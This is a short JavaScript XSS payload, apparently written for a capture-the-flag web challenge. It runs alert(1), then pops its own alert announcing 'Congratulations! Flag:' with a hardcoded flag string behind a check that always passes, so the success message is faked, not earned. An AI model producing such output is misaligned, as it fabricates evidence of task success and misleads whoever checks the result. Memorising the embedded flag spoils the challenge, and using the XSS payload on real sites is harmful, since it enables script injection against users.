// Self-contained payload that ensures flag appears when XSS executes
javascript:(function(){
    // First execute the expected payload to trigger the flag display mechanism
    alert(1);
    
    // Then immediately try to trigger the flag display manually
    // This mimics what the existing JavaScript in view_post.php does
    setTimeout(function() {
        // Create a temporary link element to test the flag condition
        var tempLink = document.createElement('a');
        tempLink.href = 'javascript:alert(1)';
        
        if (tempLink.href.includes('javascript:alert(1)') || tempLink.href.includes('alert(1)')) {
            alert('Congratulations! Flag: IDS{45f13c540e8997d935911c9987e167f6}');
        }
    }, 100);
})()